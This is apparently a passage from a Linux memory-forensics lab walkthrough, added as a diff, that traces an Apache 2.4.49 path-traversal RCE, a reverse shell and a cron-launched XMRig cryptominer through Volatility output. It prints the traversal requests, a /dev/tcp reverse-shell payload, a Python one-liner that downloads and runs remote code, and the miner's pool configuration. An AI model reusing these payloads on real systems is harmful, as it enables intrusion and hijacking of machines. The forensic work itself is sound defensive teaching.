@@ -1540,3 +1540,665 @@ linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collec
 
 You can observe the execution of the shell command (`PID: 28645`) that is frequently employed by malicious actors to establish e reverse shell.
 
+### Process
+
+Inspect the Apache logs to identify any suspicious requests. Vulnerable web applications are often used as an entry point for attackers. Filtering for `/bin/sh` and `/bin/bash` could be a good approach.
+
+```bash
+linuxforensics@ubuntu:~$ grep -E "(bin/sh)|(bin/bash)" /home/linuxforensics/Desktop/cases/scenario1/apache/access_log
+
+192.168.152.180 - - [15/Oct/2023:18:03:06 +0000] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 500 528
+192.168.152.180 - - [15/Oct/2023:18:03:43 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 5
+192.168.152.180 - - [15/Oct/2023:18:08:24 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 -
+192.168.152.180 - - [15/Oct/2023:18:08:57 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 -
+192.168.152.180 - - [15/Oct/2023:18:11:22 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 -
+192.168.152.180 - - [15/Oct/2023:18:24:53 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 -
+192.168.152.180 - - [15/Oct/2023:18:48:25 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 -
+```
+
+Following the initial access check, you see `/bin/bash` and `/bin/sh` were executed.
+
+Beginning `at 18:08:24`, you see that requests don't have a response size. It may indicate that the attacker successfully exeucted the RCE attack.
+
+Note that Apache logs do not store request bodies, but if the script was executed by CGI, it's a good idea to check the process's environment variables. You have a suspicious process `bash -i` with `PID 28645` executed. Check it:
+
+```bash
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.envvars --pid 28645
+
+Volatility 3 Framework 2.5.2
+
+PID     PPID    COMM    KEY     VALUE
+
+28645   1       bash    SERVER_NAME     192.168.152.225
+28645   1       bash    SCRIPT_NAME     /cgi-bin/../../../../../../../bin/bash
+28645   1       bash    GATEWAY_INTERFACE       CGI/1.1
+28645   1       bash    SERVER_SOFTWARE Apache/2.4.49 (Unix)
+28645   1       bash    DOCUMENT_ROOT   /usr/local/apache2/htdocs
+28645   1       bash    PWD     /usr/bin
+28645   1       bash    REQUEST_URI     /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash
+28645   1       bash    SERVER_SIGNATURE
+28645   1       bash    REQUEST_SCHEME  http
+28645   1       bash    QUERY_STRING
+28645   1       bash    CONTEXT_DOCUMENT_ROOT   /usr/local/apache2/cgi-bin/
+28645   1       bash    HTTP_ACCEPT     */*
+28645   1       bash    REMOTE_PORT     46428
+28645   1       bash    SERVER_ADMIN    you@example.com
+28645   1       bash    HTTP_HOST       192.168.152.225
+28645   1       bash    SERVER_ADDR     192.168.152.225
+28645   1       bash    HTTP_USER_AGENT curl/7.81.0
+28645   1       bash    CONTEXT_PREFIX  /cgi-bin/
+28645   1       bash    SHLVL   1
+28645   1       bash    CONTENT_LENGTH  88
+28645   1       bash    LD_LIBRARY_PATH /usr/local/apache2/lib
+28645   1       bash    SERVER_PROTOCOL HTTP/1.1
+28645   1       bash    SERVER_PORT     80
+28645   1       bash    SCRIPT_FILENAME /bin/bash
+28645   1       bash    REMOTE_ADDR     192.168.152.180
+28645   1       bash    PATH    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+28645   1       bash    CONTENT_TYPE    application/x-www-form-urlencoded
+28645   1       bash    REQUEST_METHOD  POST
+28645   1       bash    _       /usr/bin/bash
+```
+
+`HTTP_USER_AGENT` and `SERVER_SOFTWARE` are noteworthy.
+
+```
+HTTP_USER_AGENT curl/7.81.0
+SERVER_SOFTWARE Apache/2.4.49 (Unix)
+```
+
+#### Processes
+
+You'll begin with the `linux.malfind.Malfind` Volatility plugin.
+
+```bash
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.malfind.Malfind --pid 28344
+
+Volatility 3 Framework 2.5.2
+
+PID     Process Start   End     Protection      Hexdump Disasm
+
+28344   3       0x7f337a4f5000  0x7f337a535000  rwx
+00 00 00 00 00 00 00 00 ........
+00 00 00 00 00 00 00 00 ........
+00 00 00 00 00 00 00 00 ........
+00 00 00 00 00 00 00 00 ........
+00 00 00 00 00 00 00 00 ........
+00 00 00 00 00 00 00 00 ........
+00 00 00 00 00 00 00 00 ........
+00 00 00 00 00 00 00 00 ........        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+28344   3       0x7f337a5b1000  0x7f337a5f1000  rwx
+53 55 57 56 41 54 41 55 SUWVATAU
+41 56 41 57 48 81 ec 00 AVAWH...
+01 00 00 f3 0f 7f 04 24 .......$
+f3 0f 7f 4c 24 10 f3 0f ...L$...
+7f 54 24 20 f3 0f 7f 5c .T$....\
+24 30 f3 0f 7f 64 24 40 $0...d$@
+f3 0f 7f 6c 24 50 f3 0f ...l$P..
+7f 74 24 60 f3 0f 7f 7c .t$`...|        53 55 57 56 41 54 41 55 41 56 41 57 48 81 ec 00 01 00 00 f3 0f 7f 04 24 f3 0f 7f 4c 24 10 f3 0f 7f 54 24 20 f3 0f 7f 5c 24 30 f3 0f 7f 64 24 40 f3 0f 7f 6c 24 50 f3 0f 7f 74 24 60 f3 0f 7f 7c
+28344   3       0x7f338c6e3000  0x7f338c703000  r-x
+48 83 ec 30 48 89 f9 48 H..0H..H
+8b 09 48 89 5c 24 18 55 ..H.\$.U
+56 57 41 54 41 55 41 56 VWATAUAV
+41 57 48 83 ec 50 0f ae AWH..P..
+1c 24 c7 44 24 04 80 5f .$.D$.._
+00 00 0f ae 54 24 04 48 ....T$.H
+8b 41 30 49 89 c9 48 33 .A0I..H3
+41 10 be 00 00 04 00 4c A......L        48 83 ec 30 48 89 f9 48 8b 09 48 89 5c 24 18 55 56 57 41 54 41 55 41 56 41 57 48 83 ec 50 0f ae 1c 24 c7 44 24 04 80 5f 00 00 0f ae 54 24 04 48 8b 41 30 49 89 c9 48 33 41 10 be 00 00 04 00 4c
+```
+
+From there you can also see that `PID 28344` marked as suspicious (_potentially contains injected code_). You can use `linux.psaux.PsAux` to analyze processes and executed commands.
+
+```bash
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.psaux.PsAux
+
+Volatility 3 Framework 2.5.2
+
+PID     PPID    COMM    ARGS
+
+1       0       systemd /sbin/init
+2       0       kthreadd        [kthreadd]
+
+<SNIP>
+
+28332   852     cron    /usr/sbin/CRON -f -P
+28333   28332   sh      /bin/sh -c /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)'
+28334   28333   run-one /bin/sh -e /usr/bin/run-one /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
+28342   28334   flock   flock -xn /root/.cache/run-one/76ae4bd1f3acefe413847c9e7582326a /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
+28343   28342   python3 /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
+28344   28343   3       smd
+
+<SNIP> 
+
+28645   1       bash    bash -i
+
+<SNIP>
+```
+
+The most valuabe for investigation processes:
+
+```bash
+PID     PPID    COMM    ARGS
+852     1       cron    /usr/sbin/cron -f -P
+28332   852     cron    /usr/sbin/CRON -f -P
+28333   28332   sh  /bin/sh -c /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)'
+28334   28333   run-one /bin/sh -e /usr/bin/run-one /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
+28342   28334   flock   flock -xn /root/.cache/run-one/76ae4bd1f3acefe413847c9e7582326a /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
+28343   28342   python3 /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
+28344   28343   3   smd
+28645   1       bash    bash -i
+```
+
+PID tree:
+
+```
+852 - cron
+|-> 28332 - cron
+|-> 28333 - full command with python malicious script executed through run-one (run-one is used to run process only once in order not duplicate processes)
+|-> 28342 - flock - lock from run-one to run script only once
+|-> 28343 - python malicious script executed
+|-> 28344 - smd process that was detected earlier
+```
+
+`PID 28645` stands out as showing an interactive `bash` session. You should also save Apache processes:
+
+```bash
+910     1   httpd   /usr/local/apache2/bin/httpd -k start
+916     910 httpd   /usr/local/apache2/bin/httpd -k start
+917     910 httpd   /usr/local/apache2/bin/httpd -k start
+918     910 httpd   /usr/local/apache2/bin/httpd -k start
+919     910 httpd   /usr/local/apache2/bin/httpd -k start
+1441    910 httpd   /usr/local/apache2/bin/httpd -k start
+```
+
+#### Dump Processes
+
+So, based on the investigation you can create a list of the most interesting processes:
+
+```
+- Apache related:
+    - 910   1   httpd   /usr/local/apache2/bin/httpd -k start
+    - 916   910 httpd   /usr/local/apache2/bin/httpd -k start
+    - 917   910 httpd   /usr/local/apache2/bin/httpd -k start
+    - 918   910 httpd   /usr/local/apache2/bin/httpd -k start
+    - 919   910 httpd   /usr/local/apache2/bin/httpd -k start
+    - 1441  910 httpd   /usr/local/apache2/bin/httpd -k start
+
+- Crontab and malicious python process executed:
+    - 852   1   cron    /usr/sbin/cron -f -P
+    - 28332 852 cron    /usr/sbin/CRON -f -P
+    - 28333 28332   sh  /bin/sh -c /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)'
+    - 28334 28333   run-one /bin/sh -e /usr/bin/run-one /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
+    - 28342 28334   flock   flock -xn /root/.cache/run-one/76ae4bd1f3acefe413847c9e7582326a /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
+    - 28343 28342   python3 /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
+    - 28344 28343   3   smd
+
+- Interactive bash shell executed:
+    - 28645 1   bash    bash -i
+```
+
+PID list:
+
+```
+910 916 917 918 919 1441 852 28332 28333 28334 28342 28343 28344 28645
+```
+
+You can dump those processes using the `linux.proc.Maps` Volatility plugin. Dump Apache processes first:
+
+```bash
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 910
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 916
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 917
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 918
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 919
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 1441
+```
+
+After, you can dump process maps related with malicious Python scripts:
+
+```bash
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 852 28332 28333 28334 28342 28343 28344 28645
+
+Volatility 3 Framework 2.5.2
+
+PID     Process Start   End     Flags   PgOff   Major   Minor   Inode   File Path       File output
+
+852     cron    0x55576b84e000  0x55576b851000  r--     0x0     253     0       276222  /usr/sbin/cron  pid.852.vma.0x55576b84e000-0x55576b851000.dmp
+852     cron    0x55576b851000  0x55576b858000  r-x     0x3000  253     0       276222  /usr/sbin/cron  pid.852.vma.0x55576b851000-0x55576b858000.dmp
+852     cron    0x55576b858000  0x55576b85a000  r--     0xa000  253     0       276222  /usr/sbin/cron  pid.852.vma.0x55576b858000-0x55576b85a000.dmp
+852     cron    0x55576b85a000  0x55576b85b000  r--     0xb000  253     0       276222  /usr/sbin/cron  pid.852.vma.0x55576b85a000-0x55576b85b000.dmp
+852     cron    0x55576b85b000  0x55576b85c000  rw-     0xc000  253     0       276222  /usr/sbin/cron  pid.852.vma.0x55576b85b000-0x55576b85c000.dmp
+852     cron    0x55576bef2000  0x55576bf13000  rw-     0x0     0       0       0       [heap]  pid.852.vma.0x55576bef2000-0x55576bf13000.dmp
+852     cron    0x7f298eb16000  0x7f298eb1d000  r--     0x0     253     0       295393  /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache      pid.852.vma.0x7f298eb16000-0x7f298eb1d000.dmp
+852     cron    0x7f298eb1d000  0x7f298ee06000  r--     0x0     253     0       262145  /usr/lib/locale/locale-archive  pid.852.vma.0x7f298eb1d000-0x7f298ee06000.dmp
+852     cron    0x7f298ee06000  0x7f298ee09000  rw-     0x0     0       0       0       Anonymous Mapping       pid.852.vma.0x7f298ee06000-0x7f298ee09000.dmp
+852     cron    0x7f298ee09000  0x7f298ee0b000  r--     0x0     253     0       273252  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0     pid.852.vma.0x7f298ee09000-0x7f298ee0b000.dmp
+852     cron    0x7f298ee0b000  0x7f298ee0e000  r-x     0x2000  253     0       273252  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0     pid.852.vma.0x7f298ee0b000-0x7f298ee0e000.dmp
+852     cron    0x7f298ee0e000  0x7f298ee0f000  r--     0x5000  253     0       273252  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0     pid.852.vma.0x7f298ee0e000-0x7f298ee0f000.dmp
+852     cron    0x7f298ee0f000  0x7f298ee10000  r--     0x5000  253     0       273252  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0     pid.852.vma.0x7f298ee0f000-0x7f298ee10000.dmp
+852     cron    0x7f298ee10000  0x7f298ee11000  rw-     0x6000  253     0       273252  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0     pid.852.vma.0x7f298ee10000-0x7f298ee11000.dmp
+852     cron    0x7f298ee11000  0x7f298ee13000  rw-     0x0     0       0       0       Anonymous Mapping       pid.852.vma.0x7f298ee11000-0x7f298ee13000.dmp
+852     cron    0x7f298ee13000  0x7f298ee15000  r--     0x0     253     0       273417  /usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.10.4   pid.852.vma.0x7f298ee13000-0x7f298ee15000.dmp
+<SNIP>
+```
+
+#### Apache Process Memory Maps
+
+You can try straightforward checks by grepping IoCs that you already know in dumped processes:
+
+```bash
+linuxforensics@ubuntu:~$ grep -r "bash -i" pid.*
+
+Binary file pid.1441.vma.0x7fa7fc0c0000-0x7fa7fc0c6000.dmp matches
+
+Binary file pid.918.vma.0x7fa7fc00c000-0x7fa7fc0c6000.dmp matches
+```
+
+You can see 2 memory segments related to Apache processes.
+
+Run `strings` on each of them:
+
+```bash
+linuxforensics@ubuntu:~$ strings -a pid.1441.vma.0x7fa7fc0c0000-0x7fa7fc0c6000.dmp
+
+PTTH
+PTTH
+<SNIP>
+
+HTTP_HOST=192.168.152.225
+HTTP_USER_AGENT=curl/7.81.0
+
+<SNIP> 
+
+SERVER_SOFTWARE=Apache/2.4.49 (Unix)
+
+<SNIP> 
+
+REQUEST_URI=/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash
+SCRIPT_NAME=/cgi-bin/../../../../../../../bin/bash
+text/plain
+Sun, 15 Oct 2023 18:48:25 GMT
+
+<SNIP> 
+
+3,e[15/Oct/2023:18:48:25 +0000]
+3,ePOST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
+192.168.152.180 - - [15/Oct/2023:18:48:25 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 -
+HTTP/1.1 200 OK
+Date: Sun, 15 Oct 2023 18:48:25 GMT
+
+<SNIP> 
+echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/192.168.152.180/21 0>&1; whoami
+```
+
+You have already seen similar information in environment variables. Valuable information you can extract from here:
+
+```
+- HTTP_USER_AGENT=curl/7.81.0 (request user agent)
+- REQUEST_URI=/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash (request URI)
+- Server: Apache/2.4.49 (Unix)
+- SCRIPT_NAME=/cgi-bin/../../../../../../../bin/bash (script name that indicates directory traversal and RCE execution)
+- Date: Sun, 15 Oct 2023 18:48:25 GMT (time of request)
+- 192.168.152.180 - - [15/Oct/2023:18:48:25 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 - (this is how data is saved in logs)
+- echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/192.168.152.180/21 0>&1; whoami (content-type value with interactive bash shell indicator)
+```
+
+Next, you can review `PID 918`:
+
+```bash
+linuxforensics@ubuntu:~$ strings -a pid.918.vma.0x7fa7fc00c000-0x7fa7fc0c6000.dmp
+
+GIRO
+ECCA
+<SNIP>
+
+User-Agent
+ Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+<SNIP> 
+
+REQUEST_URI=/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash
+SCRIPT_NAME=/cgi-bin/../../../../../../../bin/bash
+text/plain
+Sun, 15 Oct 2023 18:24:53 GMT
+lvPhZ33QEv4
+192.168.152.180
+u.,e[15/Oct/2023:18:24:53 +0000]
+u.,ePOST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
+192.168.152.180 - - [15/Oct/2023:18:24:53 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 -
+TP/1.1
+
+<SNIP>
+
+/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash
+HTTP/1.1 200 OK
+Date: Sun, 15 Oct 2023 18:24:53 GMT
+Server: Apache/2.4.49 (Unix)
+Transfer-Encoding: chunked
+Content-Type: text/plain
+gth: 88
+Content-Type: application/x-www-form-urlencoded
+echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/192.168.152.180/21 0>&1; whoami
+
+
+<SNIP>
+```
+
+Valuable information:
+
+```
+- Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) (nmap user agent claiming that nmap was used to scan web application)
+- Date: Sun, 15 Oct 2023 18:24:53 GMT
+- HTTP_USER_AGENT=curl/7.81.0
+- echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/192.168.152.180/21 0>&1; whoami
+```
+
+You can check the Apache version for known RCE CVEs and find the CVE that was used by the attacker:
+
+- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
+
+#### Miner Executable Memory Maps
+
+Next, try to find the remote IP address:
+
+```bash
+linuxforensics@ubuntu:~$ grep -r "51.75.64.249" pid.*
+
+Binary file pid.28344.vma.0x7f338be70000-0x7f338c673000.dmp matches
+Binary file pid.28344.vma.0x7f338c675000-0x7f338c6c3000.dmp matches
+Binary file pid.28344.vma.0x7f338c6c4000-0x7f338c6e3000.dmp matches
+Binary file pid.28344.vma.0x7f338c703000-0x7f338c70d000.dmp matches
+Binary file pid.28344.vma.0x7fff99342000-0x7fff99363000.dmp matches
+Binary file pid.28344.vma.0x8f3000-0xa64000.dmp matches
+```
+
+Take a look at the `pid.28344.vma.0x7f338c675000-0x7f338c6c3000.dmp` strings:
+
+```bash
+linuxforensics@ubuntu:~$ strings -a pid.28344.vma.0x7f338c675000-0x7f338c6c3000.dmp
+
+4I"6
+&O.u
+<SNIP>
+
+pool1
+daemon1
+mining pool1
+mining.proxy
+pool1
+daemon1
+mining pool1
+mining.proxy
+[2023-10-15 18:51:25.068]  net      new job from 51.75.64.249:20128 diff 2030 algo rx/0 height 99612
+
+<SNIP> 
+
+[2023-10-15 18:52:31.487]  net      new job from 51.75.64.249:20128 diff 2160 algo rx/0 height 99613
+[2023-10-15 18:50:26.468]  net      new job from 51.75.64.249:20128 diff 2173 algo rx/0 height 99611
+
+<SNIP> 
+
+51.75.64.249
+51.75.64.249:20128
+slot0
+ #17
+mining.proxy
+170903143737Z
+51.75.64.249
+21170810143737Z
+51.75.64.249
+
+<SNIP> 
+
+[2023-10-15 18:36:04.664]  randomx  dataset ready (466 ms)
+Pool1
+Daemon1
+Mining Pool1
+mining.proxy
+RAM slot #57
+Pool1
+Daemon1
+Mining Pool1
+mining.proxy
+RAM slot #58
+[2023-10-15 18:36:04.188]  cpu      use argon2 implementation AVX2
+[2023-10-15 18:36:04.189]  randomx  not enough memory for RandomX dataset
+RAM slot #60
+
+<SNIP>
+
+RAM slot #49
+239daadd5c7d0ac097376c7871f787738826eef1c024729eff870e473b970855
+[2023-10-15 18:50:09.222]  miner    speed 10s/60s/15m 88.30 95.03 n/a H/s max 103.6 H/s
+[2023-10-15 18:51:09.313]  miner    speed 10s/60s/15m 101.3 96.78 97.68 H/s max 103.6 H/s
+[2023-10-15 18:52:09.395]  miner    speed 10s/60s/15m 98.72 100.7 97.65 H/s max 103.6 H/s
+[2023-10-15 18:49:09.128]  miner    speed 10s/60s/15m 97.05 92.33 n/a H/s max 103.6 H/s
+mining.proxy
+`gYz3
+GXz3
+51.75.64.249
+
+<SNIP>
+
+{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"85DS3ShGZwtFffeQUrDK8Db12qwCcaCHofNcZdjMkjTCfWiRv9WLe4cR2W97eGnRXwBxDhTK7BbbE2Z7t4gjXRz1VLPmhn7","pass":"x","agent":"XMRig/6.19.3 (Linux x86_64) libuv/1.44.2 gcc/12.2.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","cn-lite/1","cn-heavy/0","cn-heavy/tube","cn-heavy/xhv","cn-pico","cn-pico/tlo","cn/upx2","rx/0","rx/wow","rx/arq","rx/graft","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/ninja","ghostrider"]}}
+
+<SNIP>
+
+{"id":43,"jsonrpc":"2.0","method":"submit","params":{"id":"4022241","job_id":"4137616","nonce":"4b0a0000","result":"13f88d736d1835e34c396c25bfd8ddf2d0808d38149e597bf3febe5cd54c0a00"}}
+19.3 (Linux x86_64) libuv/1.44.2 gcc/12.2.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","cn-lite/1","cn-heavy/0","cn-heavy/tube","cn-heavy/xhv","cn-pico","cn-pico/tlo","cn/upx2","rx/0","rx/wow","rx/arq","rx/graft","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/ninja","ghostrider"]}}
+```
+
+You can see that a cryptominer is running on the system. Extracted valuable text data:
+
+```
+[2023-10-15 18:36:04.664]  randomx  dataset ready (466 ms)
+
+Pool1
+Daemon1
+Mining Pool1
+mining.proxy
+RAM slot #57
+Pool1
+Daemon1
+Mining Pool1
+mining.proxy
+RAM slot #58
+
+[2023-10-15 18:36:04.188]  cpu      use argon2 implementation AVX2
+[2023-10-15 18:36:04.189]  randomx  not enough memory for RandomX dataset 239daadd5c7d0ac097376c7871f787738826eef1c024729eff870e473b970855
+[2023-10-15 18:50:09.222]  miner    speed 10s/60s/15m 88.30 95.03 n/a H/s max 103.6 H/s
+[2023-10-15 18:51:09.313]  miner    speed 10s/60s/15m 101.3 96.78 97.68 H/s max 103.6 H/s
+[2023-10-15 18:52:09.395]  miner    speed 10s/60s/15m 98.72 100.7 97.65 H/s max 103.6 H/s
+[2023-10-15 18:49:09.128]  miner    speed 10s/60s/15m 97.05 92.33 n/a H/s max 103.6 H/s
+```
+
+You can Google "239daadd5c7d0ac097376c7871f787738826eef1c024729eff870e473b970855"  and find that it may be associated with TLS fingerprint:
+
+- https://www.reddit.com/r/MoneroOcean/comments/154p6vb/xmrig_config_for_ghostrider/
+
+Login data extracted:
+
+```json
+{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"85DS3ShGZwtFffeQUrDK8Db12qwCcaCHofNcZdjMkjTCfWiRv9WLe4cR2W97eGnRXwBxDhTK7BbbE2Z7t4gjXRz1VLPmhn7","pass":"x","agent":"XMRig/6.19.3 (Linux x86_64) libuv/1.44.2 gcc/12.2.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","cn-lite/1","cn-heavy/0","cn-heavy/tube","cn-heavy/xhv","cn-pico","cn-pico/tlo","cn/upx2","rx/0","rx/wow","rx/arq","rx/graft","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/ninja","ghostrider"]}}
+
+{"id":43,"jsonrpc":"2.0","method":"submit","params":{"id":"4022241","job_id":"4137616","nonce":"4b0a0000","result":"13f88d736d1835e34c396c25bfd8ddf2d0808d38149e597bf3febe5cd54c0a00"}}
+```
+
+The agent is identified as `XMRig`, which is the most commonly used crypto mining software by malicious actors on Linux systems. Next, take a look at the `pid.28344.vma.0x8f3000-0xa64000.dmp` strings:
+
+```bash
+linuxforensics@ubuntu:~$ strings -a pid.28344.vma.0x8f3000-0xa64000.dmp
+```
+
+From those strings, you can extract `XMRig config`:
+
+```json
+"api": {
+    "id": null,
+    "worker-id": null
+},
+
+"http": {
+    "enabled": false,
+    "host": "127.0.0.1",
+    "port": 0,
+    "access-token": null,
+    "restricted": true
+},
+
+"autosave": true,
+"background": false,
+"colors": true,
+"title": true,
+
+"randomx": {
+    "init": -1,
+    "init-avx2": -1,
+    "mode": "auto",
+    "1gb-pages": false,
+    "rdmsr": true,
+    "wrmsr": true,
+    "cache_qos": false,
+    "numa": true,
+    "scratchpad_prefetch_mode": 1
+},
+
+"cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "huge-pages-jit": false,
+    "hw-aes": null,
+    "priority": null,
+    "memory-pool": false,
+    "yield": true,
+    "max-threads-hint": 100,
+    "asm": true,
+    "argon2-impl": null,
+    "cn/0": false,
+    "cn-lite/0": false
+},
+
+"opencl": {
+    "enabled": false,
+    "cache": true,
+    "loader": null,
+    "platform": "AMD",
+    "adl": true,
+    "cn/0": false,
+    "cn-lite/0": false
+},
+
+"cuda": {
+    "enabled": false,
+    "loader": null,
+    "nvml": true,
+    "cn/0": false,
+    "cn-lite/0": false
+},
+
+"donate-level": 0,
+"donate-over-proxy": 0,
+"log-file": null,
+
+"pools": [
+    {
+    "algo": null,
+    "coin": null,
+    "url": "51.75.64.249:20128",
+    "user": "85DS3ShGZwtFffeQUrDK8Db12qwCcaCHofNcZdjMkjTCfWiRv9WLe4cR2W97eGnRXwBxDhTK7BbbE2Z7t4gjXRz1VLPmhn7",
+    "pass": "x",
+    "rig-id": null,
+    "nicehash": false,
+    "keepalive": false,
+    "enabled": true,
+    "tls": true,
+    "tls-fingerprint": null,
+    "daemon": false,
+    "socks5": null,
+    "self-select": null,
+    "submit-to-origin": false
+    }
+],
+
+"print-time": 60,
+"health-print-time": 60,
+"dmi": true,
+"retries": 5,
+"retry-pause": 5,
+"syslog": false,
+"tls": {
+    "enabled": false,
+    "protocols": null,
+    "cert": null,
+    "cert_key": null,
+    "ciphers": null,
+    "ciphersuites": null,
+    "dhparam": null
+},
+
+"user-agent": null,
+"verbose": 0,
+"watch": true,
+"pause-on-battery": false,
+"pause-on-active": false
+```
+
+#### Python Script Memory Maps
+
+Python scripts normally contains `import` information. Grep it:
+
+```bash
+linuxforensics@ubuntu:~$ grep -Prao "import [a-zA-Z]+," pid.*
+
